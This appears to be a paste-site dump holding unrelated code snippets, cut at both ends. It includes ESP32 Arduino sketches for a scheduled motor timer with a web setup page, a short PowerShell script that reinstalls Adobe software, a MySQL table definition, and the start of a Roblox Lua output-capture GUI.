    client.println(""<div class='selected-hours'>"");
    client.println(""<p>✅ Schedule set! Motor will run at:</p>"");
    String selectedHours = """";
    int count = 0;
    for (int h = 0; h < 24; h++) {
      if (hourlySchedule[h]) {
        if (count > 0) selectedHours += "", "";
        selectedHours += String(h < 10 ? ""0"" : """") + String(h) + "":00"";
        count++;
      }
    }
    if (count == 0) {
      client.println(""<p>No hours selected</p>"");
    } else {
      client.println(""<p>"" + selectedHours + ""</p>"");
      client.println(""<p>Total: "" + String(count) + "" times per day</p>"");
      if (runTimeWasSet) {
        client.println(""<p>Each run: "" + String(motorRunTime) + "" seconds</p>"");
      }
    }
    client.println(""</div>"");
  } else {
    client.println(""<form action='/setSchedule' method='POST'>"");
    client.println(""<div class='schedule-grid'>"");

    // Create 24 checkboxes for each hour
    for (int h = 0; h < 24; h++) {
      client.println(""<div class='hour-checkbox'>"");
      client.println(""<input type='checkbox' name='hour"" + String(h) + ""' value='1'"" +
                     (hourlySchedule[h] ? "" checked"" : """") + "">"");
      client.println(""<label>"" + String(h < 10 ? ""0"" : """") + String(h) + "":00</label>"");
      client.println(""</div>"");
    }

    client.println(""</div>"");
    client.println(""<button type='submit'>Set Schedule</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  if (timeWasSet && scheduleWasSet && runTimeWasSet) {
    client.println(""<div class='step'>"");
    client.println(""<h3>✅ Setup Complete!</h3>"");
    client.println(""<p>ESP32 will now enter scheduled operation mode.</p>"");
    client.println(""<p><strong>Configuration Summary:</strong></p>"");
    client.println(""<ul style='text-align:left;display:inline-block;'>"");
    client.println(""<li>Motor run time: "" + String(motorRunTime) + "" seconds</li>"");
    
    String selectedHours = """";
    int count = 0;
    for (int h = 0; h < 24; h++) {
      if (hourlySchedule[h]) {
        if (count > 0) selectedHours += "", "";
        selectedHours += String(h < 10 ? ""0"" : """") + String(h) + "":00"";
        count++;
      }
    }
    client.println(""<li>Schedule: "" + selectedHours + ""</li>"");
    client.println(""<li>Total daily runtime: "" + String(count * motorRunTime) + "" seconds</li>"");
    client.println(""</ul>"");
    client.println(""<button onclick='startOperation()'>Start Operation</button>"");
    client.println(""</div>"");
  }

  client.println(""</div>"");

  // JavaScript for time updates, countdown, and run time display
  client.println(""<script>"");
  client.println(""var countdown = "" + String(remaining) + "";"");
  client.println(""function updateTime(){"");
  client.println(""var now=new Date();"");
  client.println(""if(document.getElementById('currentTime'))"");
  client.println(""document.getElementById('currentTime').innerHTML='Current Time: '+now.toLocaleString();"");
  client.println(""if(document.getElementById('hiddenEpochTime'))"");
  client.println(""document.getElementById('hiddenEpochTime').value=Math.floor(now.getTime()/1000);"");
  client.println(""}"");
  client.println(""function updateCountdown(){"");
  client.println(""countdown--;"");
  client.println(""document.getElementById('countdown').innerHTML=countdown;"");
  client.println(""if(countdown<=0){"");
  client.println(""document.body.innerHTML='<h2>Timeout reached - ESP32 entering sleep mode</h2>';"");
  client.println(""}"");
  client.println(""}"");
  client.println(""function updateRunTimeDisplay(value){"");
  client.println(""document.getElementById('runTimeDisplay').innerHTML=value+' seconds';"");
  client.println(""}"");
  client.println(""function startOperation(){"");
  client.println(""document.body.innerHTML='<h2>Starting scheduled operation...</h2><p>ESP32 entering deep sleep mode</p>';"");
  client.println(""setTimeout(function(){window.location.reload();},2000);"");
  client.println(""}"");
  client.println(""setInterval(updateTime,1000);"");
  client.println(""setInterval(updateCountdown,1000);"");
  client.println(""updateTime();"");
  client.println(""</script></body></html>"");
  client.println();
}

void handleTimeSyncRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  int epochIndex = requestBody.indexOf(""epochTime="");
  if (epochIndex != -1) {
    long epochTime = requestBody.substring(epochIndex + 10).toInt();
    rtc.setTime(epochTime);
    timeWasSet = true;

    Serial.println(""Time synchronized: "" + rtc.getTime(""%A, %B %d %Y %H:%M:%S""));

    // Send redirect back to main page
    client.println(""HTTP/1.1 302 Found"");
    client.println(""Location: /"");
    client.println();
  }
}

void handleRunTimeRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  Serial.println(""Run time request body: "" + requestBody);

  int runTimeIndex = requestBody.indexOf(""runTime="");
  if (runTimeIndex != -1) {
    int newRunTime = requestBody.substring(runTimeIndex + 8).toInt();
    
    // Validate run time is within acceptable range
    if (newRunTime >= MIN_MOTOR_ON_TIME && newRunTime <= MAX_MOTOR_ON_TIME) {
      motorRunTime = newRunTime;
      runTimeWasSet = true;
      Serial.println(""Motor run time set to: "" + String(motorRunTime) + "" seconds"");
    } else {
      Serial.println(""Invalid run time: "" + String(newRunTime) + "". Using default: "" + String(DEFAULT_MOTOR_ON_TIME));
      motorRunTime = DEFAULT_MOTOR_ON_TIME;
      runTimeWasSet = true;
    }
  }

  // Send redirect back to main page
  client.println(""HTTP/1.1 302 Found"");
  client.println(""Location: /"");
  client.println();
}

void handleScheduleRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  Serial.println(""Schedule request body: "" + requestBody);

  // Reset all hours first
  for (int h = 0; h < 24; h++) {
    hourlySchedule[h] = false;
  }

  // Parse checkbox data
  for (int h = 0; h < 24; h++) {
    String hourParam = ""hour"" + String(h) + ""=1"";
    if (requestBody.indexOf(hourParam) != -1) {
      hourlySchedule[h] = true;
      Serial.println(""Hour "" + String(h) + "" enabled"");
    }
  }

  scheduleWasSet = true;

  Serial.println(""Schedule updated:"");
  int enabledCount = 0;
  for (int h = 0; h < 24; h++) {
    if (hourlySchedule[h]) {
      Serial.println(""- "" + String(h) + "":00"");
      enabledCount++;
    }
  }
  Serial.println(""Total enabled hours: "" + String(enabledCount));
  Serial.println(""Total daily motor runtime: "" + String(enabledCount * motorRunTime) + "" seconds"");

  // If all settings are configured, start operation
  if (timeWasSet && scheduleWasSet && runTimeWasSet) {
    delay(2000); // Allow user to see confirmation
    scheduleNextWakeup();
  }

  // Send redirect back to main page
  client.println(""HTTP/1.1 302 Found"");
  client.println(""Location: /"");
  client.println();
}

void printWakeupReason() {
  esp_sleep_wakeup_cause_t wakeup_reason = esp_sleep_get_wakeup_cause();

  switch (wakeup_reason) {
    case ESP_SLEEP_WAKEUP_TIMER:
      Serial.println(""Wake-up: Scheduled timer"");
      break;
    case ESP_SLEEP_WAKEUP_EXT0:
      Serial.println(""Wake-up: External signal RTC_IO"");
      break;
    case ESP_SLEEP_WAKEUP_EXT1:
      Serial.println(""Wake-up: External signal RTC_CNTL"");
      break;
    default:
      Serial.println(""Wake-up: Power on or reset"");
      break;
  }
}"
cB56bCQN,esp32_timer_twicedaily,kodilivetv,C++,Thursday 12th of June 2025 12:53:55 PM CDT,"/*
   ESP32 Scheduled Motor Control with Deep Sleep
   
   DESCRIPTION:
   • Run a motor at two configurable times of day while deep-sleeping between operations.
   
   FEATURES:
   • Schedules motor to run for 30 seconds at two daily times (configurable)
   • Uses deep sleep between operations for maximum battery efficiency
   • Web-based setup interface for time sync and schedule configuration
   • Built-in LED status indicators during setup and operation
   • RTC memory storage preserves settings through deep sleep cycles
   • Automatic timeout protection (enters sleep if no configuration within 4 minutes)
   
   HARDWARE REQUIREMENTS:
   • ESP32 development board
   • MOSFET (for motor control) connected to GPIO 33
   • Motor connected through MOSFET
   • Built-in LED on GPIO 2 (most ESP32 boards)
      
   SETUP PROCESS:
   1. Upload sketch to ESP32
   2. Connect to WiFi network ""ESP32-Motor-Timer"" (password: 12345678)
   3. Navigate to the IP address shown in Serial Monitor, usually 192.168.4.1
   4. Sync current time from your browser
   5. Set morning and evening schedule times
   6. ESP32 automatically enters scheduled operation mode
   
   OPERATION:
   • ESP32 sleeps in deep sleep mode (uses ~10µA)
   • Wakes up at scheduled times
   • Runs motor for 30 seconds with LED indication
   • Calculates next wake time and returns to deep sleep
   • Cycle repeats indefinitely
   
   DEFAULT SCHEDULE:
   • Morning: 12:30 (configurable via web interface)
   • Evening: 19:30 (configurable via web interface)
   
   TROUBLESHOOTING:
   • If setup doesn't complete, ESP32 sleeps for 3 hours then restarts setup
   • Power cycle to restart setup process
   • Check Serial Monitor (115200 baud) for debugging information
   • Time is automatically adjusted for Portuguese Summer Time (+1 hour)

*/

#include <ESP32Time.h> // https://github.com/fbiego/ESP32Time
#include <WiFi.h>

#define uS_TO_S_FACTOR 1000000ULL  // Conversion factor for micro seconds to seconds
#define MOTOR_ON_TIME 30           // Motor run time in seconds
#define MOTOR_PIN 33               // GPIO pin connected to MOSFET gate
#define LED_PIN 2                  // Built-in LED for status indication

// WiFi credentials for initial time sync
const char *ssid = ""ESP32-Motor-Timer"";
const char *password = ""12345678"";

//ESP32Time rtc;
ESP32Time rtc(3600);  // offset in seconds GMT+1 Portugal Summer Time
WiFiServer server(80);

// RTC memory variables (survive deep sleep)
RTC_DATA_ATTR bool timeWasSet = false;
RTC_DATA_ATTR bool scheduleWasSet = false;
RTC_DATA_ATTR int bootCount = 0;
RTC_DATA_ATTR unsigned long webServerStartTime = 0;

// Schedule times (stored in RTC memory - user configurable)
RTC_DATA_ATTR int MORNING_HOUR = 12;    // Default values
RTC_DATA_ATTR int MORNING_MINUTE = 30;
RTC_DATA_ATTR int EVENING_HOUR = 19;
RTC_DATA_ATTR int EVENING_MINUTE = 30;

void setup() {
  Serial.begin(115200);
  delay(1000);

  bootCount++;
  Serial.println(""Boot count: "" + String(bootCount));

  // Initialize pins
  pinMode(MOTOR_PIN, OUTPUT);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(MOTOR_PIN, LOW);  // Ensure motor is off initially

  printWakeupReason();

  // Check if this is a scheduled wake-up and both time and schedule have been set
  if (timeWasSet && scheduleWasSet && esp_sleep_get_wakeup_cause() == ESP_SLEEP_WAKEUP_TIMER) {
    handleScheduledWakeup();
  } else {
    // First boot, manual reset, or incomplete setup - need web interface
    webServerStartTime = millis();
    setupWebServer();
  }
}

void loop() {
  // Handle web server for time and schedule setting
  if (!timeWasSet || !scheduleWasSet) {
    // Check for 4-minute timeout
    if (millis() - webServerStartTime > 240000) { // 4 minutes = 120,000 ms
      Serial.println(""Web server timeout - entering 3-hour sleep to save battery"");
      esp_sleep_enable_timer_wakeup(3 * 3600 * uS_TO_S_FACTOR); // 3 hours
      esp_deep_sleep_start();
    }
    handleWebClient();
  }
}

void handleScheduledWakeup() {
  Serial.println(""\n=== Scheduled Wake-up ==="");
  Serial.println(""Current time: "" + rtc.getTime(""%A, %B %d %Y %H:%M:%S""));

  // Run the motor
  runMotor();

  // Calculate next wake-up time
  scheduleNextWakeup();
}

void runMotor() {
  Serial.println(""Starting motor..."");

  // Blink LED to indicate motor operation
  digitalWrite(LED_PIN, HIGH);

  // Turn on motor via MOSFET
  digitalWrite(MOTOR_PIN, HIGH);

  // Run for specified time with status updates
  for (int i = MOTOR_ON_TIME; i > 0; i--) {
    Serial.println(""Motor running... "" + String(i) + ""s remaining"");
    delay(1000);

    // Blink LED every 5 seconds during operation
    if (i % 5 == 0) {
      digitalWrite(LED_PIN, LOW);
      delay(100);
      digitalWrite(LED_PIN, HIGH);
    }
  }

  // Turn off motor
  digitalWrite(MOTOR_PIN, LOW);
  digitalWrite(LED_PIN, LOW);

  Serial.println(""Motor stopped."");
}

void scheduleNextWakeup() {
  struct tm timeinfo = rtc.getTimeStruct();
  int currentHour = timeinfo.tm_hour;
  int currentMinute = timeinfo.tm_min;

  // Calculate seconds until next scheduled time
  unsigned long sleepTime = calculateSleepTime(currentHour, currentMinute);

  Serial.println(""Next wake-up in "" + String(sleepTime / 3600) + "" hours and "" +
                 String((sleepTime % 3600) / 60) + "" minutes"");

  // Configure and enter deep sleep
  esp_sleep_enable_timer_wakeup(sleepTime * uS_TO_S_FACTOR);
  Serial.println(""Entering deep sleep..."");
  Serial.flush();
  esp_deep_sleep_start();
}

unsigned long calculateSleepTime(int currentHour, int currentMinute) {
  int currentTotalMinutes = currentHour * 60 + currentMinute;
  int morningTotalMinutes = MORNING_HOUR * 60 + MORNING_MINUTE;
  int eveningTotalMinutes = EVENING_HOUR * 60 + EVENING_MINUTE;

  int nextWakeupMinutes;

  if (currentTotalMinutes < morningTotalMinutes) {
    // Before morning time - wake up at morning time
    nextWakeupMinutes = morningTotalMinutes;
  } else if (currentTotalMinutes < eveningTotalMinutes) {
    // Between morning and evening - wake up at evening time
    nextWakeupMinutes = eveningTotalMinutes;
  } else {
    // After evening time - wake up next morning
    nextWakeupMinutes = morningTotalMinutes + (24 * 60); // Next day
  }

  int sleepMinutes = nextWakeupMinutes - currentTotalMinutes;
  return sleepMinutes * 60; // Convert to seconds
}

void setupWebServer() {
  Serial.println(""\n=== Setting up Web Server for Configuration ==="");
  Serial.println(""Connect to WiFi network: "" + String(ssid));
  Serial.println(""Password: "" + String(password));
  Serial.println(""TIMEOUT: 4 minutes (will sleep for 3 hours if no configuration)"");

  WiFi.softAP(ssid, password);
  IPAddress IP = WiFi.softAPIP();
  Serial.println(""Web interface: http://"" + IP.toString());
  server.begin();

  // Blink LED to indicate setup mode
  for (int i = 0; i < 10; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    digitalWrite(LED_PIN, LOW);
    delay(200);
  }
}

void handleWebClient() {
  WiFiClient client = server.available();

  if (client) {
    Serial.println(""Client connected"");
    String currentLine = """";

    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        if (c == '\n') {
          if (currentLine.length() == 0) {
            sendWebPage(client);
            break;
          } else {
            currentLine = """";
          }
        } else if (c != '\r') {
          currentLine += c;
        }

        if (currentLine.endsWith(""POST /syncTime"")) {
          handleTimeSyncRequest(client);
        } else if (currentLine.endsWith(""POST /setSchedule"")) {
          handleScheduleRequest(client);
        }
      }
    }
    client.stop();
  }
}

void sendWebPage(WiFiClient &client) {
  // Calculate remaining time
  unsigned long elapsed = millis() - webServerStartTime;
  unsigned long remaining = (120000 - elapsed) / 1000; // seconds remaining

  client.println(""HTTP/1.1 200 OK"");
  client.println(""Content-type:text/html"");
  client.println();
  client.println(""<!DOCTYPE html><html>"");
  client.println(""<head><title>ESP32 Motor Timer Setup</title>"");
  client.println(""<meta name='viewport' content='width=device-width, initial-scale=1'>"");
  client.println(""<style>"");
  client.println(""body{font-family:Arial;text-align:center;padding:20px;background:#f0f0f0;}"");
  client.println("".container{max-width:500px;margin:0 auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}"");
  client.println(""input,button{padding:10px;margin:5px;font-size:16px;border:1px solid #ddd;border-radius:5px;}"");
  client.println(""button{background:#4CAF50;color:white;border:none;cursor:pointer;padding:15px 30px;}"");
  client.println(""button:hover{background:#45a049;}"");
  client.println("".timeout{color:red;font-weight:bold;}"");
  client.println("".step{margin:20px 0;padding:15px;background:#f9f9f9;border-radius:5px;}"");
  client.println(""</style></head>"");
  client.println(""<body>"");
  client.println(""<div class='container'>"");
  client.println(""<h1>ESP32 Motor Timer Setup</h1>"");
  client.println(""<div class='timeout'> Timeout: <span id='countdown'>"" + String(remaining) + ""</span> seconds</div>"");

  // Step 1: Time sync
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 1: Set Current Time</h3>"");
  if (timeWasSet) {
    client.println(""<p>Time set: "" + rtc.getTime(""%H:%M:%S %d/%m/%Y"") + ""</p>"");
  } else {
    client.println(""<h4 id='currentTime'></h4>"");
    client.println(""<form action='/syncTime' method='POST'>"");
    client.println(""<input type='hidden' name='epochTime' id='hiddenEpochTime'>"");
    client.println(""<button type='submit'>Sync Time</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  // Step 2: Schedule setup
  client.println(""<div class='step'>"");
  client.println(""<h3>Step 2: Set Motor Schedule</h3>"");
  if (scheduleWasSet) {
    client.println(""<p>✅ Schedule set:</p>"");
    client.println(""<p>Morning: "" + String(MORNING_HOUR) + "":"" + String(MORNING_MINUTE < 10 ? ""0"" : """") + String(MORNING_MINUTE) + ""</p>"");
    client.println(""<p>Evening: "" + String(EVENING_HOUR) + "":"" + String(EVENING_MINUTE < 10 ? ""0"" : """") + String(EVENING_MINUTE) + ""</p>"");
    client.println(""<p>Motor runs for 30 seconds each time</p>"");
  } else {
    client.println(""<form action='/setSchedule' method='POST'>"");
    client.println(""<div>"");
    client.println(""<h4>Morning Time:</h4>"");
    client.println(""Hour: <input type='number' name='morningHour' min='0' max='23' value='"" + String(MORNING_HOUR) + ""' required> "");
    client.println(""Minute: <input type='number' name='morningMinute' min='0' max='59' value='"" + String(MORNING_MINUTE) + ""' required>"");
    client.println(""</div>"");
    client.println(""<div>"");
    client.println(""<h4>Evening Time:</h4>"");
    client.println(""Hour: <input type='number' name='eveningHour' min='0' max='23' value='"" + String(EVENING_HOUR) + ""' required> "");
    client.println(""Minute: <input type='number' name='eveningMinute' min='0' max='59' value='"" + String(EVENING_MINUTE) + ""' required>"");
    client.println(""</div>"");
    client.println(""<button type='submit'>Set Schedule</button>"");
    client.println(""</form>"");
  }
  client.println(""</div>"");

  if (timeWasSet && scheduleWasSet) {
    client.println(""<div class='step'>"");
    client.println(""<h3>✅ Setup Complete!</h3>"");
    client.println(""<p>ESP32 will now enter scheduled operation mode.</p>"");
    client.println(""<button onclick='window.location.reload()'>Start Operation</button>"");
    client.println(""</div>"");
  }

  client.println(""</div>"");

  // JavaScript for time updates and countdown
  client.println(""<script>"");
  client.println(""var countdown = "" + String(remaining) + "";"");
  client.println(""function updateTime(){"");
  client.println(""var now=new Date();"");
  client.println(""document.getElementById('currentTime').innerHTML='Current Time: '+now.toLocaleString();"");
  client.println(""var epoch=Math.floor(now.getTime()/1000);"");
  client.println(""document.getElementById('hiddenEpochTime').value=epoch;"");
  client.println(""}"");
  client.println(""function updateCountdown(){"");
  client.println(""countdown--;"");
  client.println(""document.getElementById('countdown').innerHTML=countdown;"");
  client.println(""if(countdown<=0){"");
  client.println(""document.body.innerHTML='<h2>Timeout reached - ESP32 entering sleep mode</h2>';"");
  client.println(""}"");
  client.println(""}"");
  client.println(""setInterval(updateTime,1000);"");
  client.println(""setInterval(updateCountdown,1000);"");
  client.println(""updateTime();"");
  client.println(""</script></body></html>"");
  client.println();
}

void handleTimeSyncRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  int epochIndex = requestBody.indexOf(""epochTime="");
  if (epochIndex != -1) {
    long epochTime = requestBody.substring(epochIndex + 10).toInt();

    rtc.setTime(epochTime);
    timeWasSet = true;

    Serial.println(""Time synchronized: "" + rtc.getTime(""%A, %B %d %Y %H:%M:%S""));

    // Send redirect back to main page
    client.println(""HTTP/1.1 302 Found"");
    client.println(""Location: /"");
    client.println();
  }
}

void handleScheduleRequest(WiFiClient &client) {
  String requestBody = """";
  while (client.available()) {
    requestBody += (char)client.read();
  }

  // Parse form data
  int morningHourIndex = requestBody.indexOf(""morningHour="");
  int morningMinuteIndex = requestBody.indexOf(""morningMinute="");
  int eveningHourIndex = requestBody.indexOf(""eveningHour="");
  int eveningMinuteIndex = requestBody.indexOf(""eveningMinute="");

  if (morningHourIndex != -1 && morningMinuteIndex != -1 &&
      eveningHourIndex != -1 && eveningMinuteIndex != -1) {

    // Extract values
    String morningHourStr = extractFormValue(requestBody, ""morningHour="");
    String morningMinuteStr = extractFormValue(requestBody, ""morningMinute="");
    String eveningHourStr = extractFormValue(requestBody, ""eveningHour="");
    String eveningMinuteStr = extractFormValue(requestBody, ""eveningMinute="");

    MORNING_HOUR = morningHourStr.toInt();
    MORNING_MINUTE = morningMinuteStr.toInt();
    EVENING_HOUR = eveningHourStr.toInt();
    EVENING_MINUTE = eveningMinuteStr.toInt();

    // Validate times
    if (MORNING_HOUR >= 0 && MORNING_HOUR <= 23 && MORNING_MINUTE >= 0 && MORNING_MINUTE <= 59 &&
        EVENING_HOUR >= 0 && EVENING_HOUR <= 23 && EVENING_MINUTE >= 0 && EVENING_MINUTE <= 59) {

      scheduleWasSet = true;

      Serial.println(""Schedule set:"");
      Serial.println(""Morning: "" + String(MORNING_HOUR) + "":"" + String(MORNING_MINUTE));
      Serial.println(""Evening: "" + String(EVENING_HOUR) + "":"" + String(EVENING_MINUTE));

      // If both time and schedule are set, start operation
      if (timeWasSet && scheduleWasSet) {
        delay(2000); // Allow user to see confirmation
        struct tm timeinfo = rtc.getTimeStruct();
        scheduleNextWakeup();
      }
    }
  }

  // Send redirect back to main page
  client.println(""HTTP/1.1 302 Found"");
  client.println(""Location: /"");
  client.println();
}

String extractFormValue(String data, String fieldName) {
  int startIndex = data.indexOf(fieldName);
  if (startIndex == -1) return """";

  startIndex += fieldName.length();
  int endIndex = data.indexOf(""&"", startIndex);
  if (endIndex == -1) endIndex = data.length();

  return data.substring(startIndex, endIndex);
}

void printWakeupReason() {
  esp_sleep_wakeup_cause_t wakeup_reason = esp_sleep_get_wakeup_cause();

  switch (wakeup_reason) {
    case ESP_SLEEP_WAKEUP_TIMER:
      Serial.println(""Wake-up: Scheduled timer"");
      break;
    case ESP_SLEEP_WAKEUP_EXT0:
      Serial.println(""Wake-up: External signal RTC_IO"");
      break;
    case ESP_SLEEP_WAKEUP_EXT1:
      Serial.println(""Wake-up: External signal RTC_CNTL"");
      break;
    default:
      Serial.println(""Wake-up: Power on or reset"");
      break;
  }
}
"
X27mxEJv,Adobe Install PowerShell,DIRT8IKE,PowerShell,Thursday 12th of June 2025 12:40:49 PM CDT,"# Last modified 5/7/25 by 


<#
    Install runs in 2 steps
    1) Uses adobe uninstall tool to clear out all existing adobe installations
    2) Installs new package from Adobe.
#>

# CLEANUP
Start-Process -FilePath ""$PSScriptRoot\AdobeUninstaller.exe"" -Wait -ArgumentList ""--all""

# INSTALL
Start-Process -FilePath ""$PSScriptRoot\InstallFiles\Build\setup.exe"" -Wait -ArgumentList ""--silent"""
URVnyXKk,testing sql,djst3rios,MySQL,Thursday 12th of June 2025 12:33:11 PM CDT,"DROP TABLE IF EXISTS `visits`;
CREATE TABLE `visits`  (
  `visits` tinyint(4) NULL DEFAULT 0
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;"
42SfKwiZ,Untitled,suramraja1,Lua,Thursday 12th of June 2025 12:00:25 PM CDT,"-- Output Capture GUI Script for AWP Executor
-- Captures all Roblox output and displays in custom GUI

local Players = game:GetService(""Players"")
local LogService = game:GetService(""LogService"")
local TweenService = game:GetService(""TweenService"")
local UserInputService = game:GetService(""UserInputService"")
local RunService = game:GetService(""RunService"")

local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild(""PlayerGui"")

-- Object Hierarchy:
-- PlayerGui
-- └── OutputCaptureGUI
--     └── MainFrame
--         ├── TopBar
--         │   ├── Title
--         │   ├── MinimizeButton
--         │   └── CloseButton
--         ├── OutputFrame
--         │   ├── ScrollingFrame
--         │   │   └── OutputList (UIListLayout)
--         │   └── ScrollBar
--         └── ControlsFrame
--             ├── ClearButton
--             ├── FilterFrame
--             │   ├── InfoToggle
--             │   ├── WarningToggle
--             │   └── ErrorToggle
--             └── ResizeHandle

-- Main GUI Creation
local OutputCaptureGUI = Instance.new(""ScreenGui"")
OutputCaptureGUI.Name = ""OutputCaptureGUI""
OutputCaptureGUI.ResetOnSpawn = false
OutputCaptureGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
OutputCaptureGUI.Parent = PlayerGui

-- Main Frame
local MainFrame = Instance.new(""Frame"")
MainFrame.Name = ""MainFrame""
MainFrame.Size = UDim2.new(0, 600, 0, 400)
MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = OutputCaptureGUI

-- Corner rounding
local MainCorner = Instance.new(""UICorner"")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Top Bar
local TopBar = Instance.new(""Frame"")
TopBar.Name = ""TopBar""
TopBar.Size = UDim2.new(1, 0, 0, 30)
TopBar.Position = UDim2.new(0, 0, 0, 0)
TopBar.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local TopBarCorner = Instance.new(""UICorner"")
TopBarCorner.CornerRadius = UDim.new(0, 8)
TopBarCorner.Parent = TopBar

-- Title
local Title = Instance.new(""TextLabel"")
Title.Name = ""Title""
Title.Size = UDim2.new(1, -60, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = ""Roblox Output Capture""
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 14
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Font = Enum.Font.SourceSansBold
Title.Parent = TopBar

-- Minimize Button
local MinimizeButton = Instance.new(""TextButton"")
MinimizeButton.Name = ""MinimizeButton""
MinimizeButton.Size = UDim2.new(0, 25, 0, 25)
MinimizeButton.Position = UDim2.new(1, -55, 0, 2.5)
MinimizeButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
MinimizeButton.BorderSizePixel = 0
MinimizeButton.Text = ""-""
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextSize = 16
MinimizeButton.Font = Enum.Font.SourceSansBold
MinimizeButton.Parent = TopBar

local MinimizeCorner = Instance.new(""UICorner"")
MinimizeCorner.CornerRadius = UDim.new(0, 4)
MinimizeCorner.Parent = MinimizeButton

-- Close Button
local CloseButton = Instance.new(""TextButton"")
CloseButton.Name = ""CloseButton""
CloseButton.Size = UDim2.new(0, 25, 0, 25)
CloseButton.Position = UDim2.new(1, -27, 0, 2.5)
CloseButton.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
CloseButton.BorderSizePixel = 0
CloseButton.Text = ""×""
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 16
CloseButton.Font = Enum.Font.SourceSansBold
CloseButton.Parent = TopBar

local CloseCorner = Instance.new(""UICorner"")
CloseCorner.CornerRadius = UDim.new(0, 4)
CloseCorner.Parent = CloseButton

-- Output Frame
local OutputFrame = Instance.new(""Frame"")
OutputFrame.Name = ""OutputFrame""
OutputFrame.Size = UDim2.new(1, -20, 1, -80)
OutputFrame.Position = UDim2.new(0, 10, 0, 35)
OutputFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
OutputFrame.BorderSizePixel = 0
OutputFrame.Parent = MainFrame

local OutputCorner = Instance.new(""UICorner"")
OutputCorner.CornerRadius = UDim.new(0, 6)
OutputCorner.Parent = OutputFrame

-- Scrolling Frame
local ScrollingFrame = Instance.new(""ScrollingFrame"")
ScrollingFrame.Name = ""ScrollingFrame""
ScrollingFrame.Size = UDim2.new(1, -10, 1, -10)
ScrollingFrame.Position = UDim2.new(0, 5, 0, 5)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 8
ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.Parent = OutputFrame

-- Output List Layout
local OutputList = Instance.new(""UIListLayout"")
OutputList.Name = ""OutputList""
OutputList.SortOrder = Enum.SortOrder.LayoutOrder
OutputList.Padding = UDim.new(0, 2)
OutputList.Parent = ScrollingFrame

-- Controls Frame
local ControlsFrame = Instance.new(""Frame"")
ControlsFrame.Name = ""ControlsFrame""
ControlsFrame.Size = UDim2.new(1, -20, 0, 35)
ControlsFrame.Position = UDim2.new(0, 10, 1, -40)
ControlsFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
ControlsFrame.BorderSizePixel = 0
ControlsFrame.Parent = MainFrame

local ControlsCorner = Instance.new(""UICorner"")
ControlsCorner.CornerRadius = UDim.new(0, 6)
ControlsCorner.Parent = ControlsFrame

-- Clear Button
local ClearButton = Instance.new(""TextButton"")
ClearButton.Name = ""ClearButton""
ClearButton.Size = UDim2.new(0, 60, 0, 25)
ClearButton.Position = UDim2.new(0, 10, 0, 5)
ClearButton.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
ClearButton.BorderSizePixel = 0
ClearButton.Text = ""Clear""
ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ClearButton.TextSize = 12
ClearButton.Font = Enum.Font.SourceSans
ClearButton.Parent = ControlsFrame

local ClearCorner = Instance.new(""UICorner"")
ClearCorner.CornerRadius = UDim.new(0, 4)
ClearCorner.Parent = ClearButton

-- Filter toggles
local filterButtons = {}
local filters = {
    {name = ""Info"", color = Color3.fromRGB(70, 130, 180), enabled = true},
    {name = ""Warning"", color = Color3.fromRGB(255, 193, 7), enabled = true},
    {name = ""Error"", color = Color3.fromRGB(220, 53, 69), enabled = true}
}

for i, filter in ipairs(filters) do
    local button = Instance.new(""TextButton"")
    button.Name = filter.name .. ""Toggle""
    button.Size = UDim2.new(0, 60, 0, 25)
    button.Position = UDim2.new(0, 80 + (i-1)*70, 0, 5)
    button.BackgroundColor3 = filter.enabled and filter.color or Color3.fromRGB(60, 60, 60)
    button.BorderSizePixel = 0
    button.Text = filter.name
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 11
    button.Font = Enum.Font.SourceSans
    button.Parent = ControlsFrame
    
    local buttonCorner = Instance.new(""UICorner"")
    buttonCorner.CornerRadius = UDim.new(0, 4)
    buttonCorner.Parent = button
    
    filterButtons[filter.name:lower()] = {button = button, enabled = filter.enabled, color = filter.color}
end

-- Variables for output management
local outputMessages = {}
local messageCount = 0
local isMinimized = false
local maxMessages = 1000 -- Memory optimization

-- Message type colors
local messageColors = {
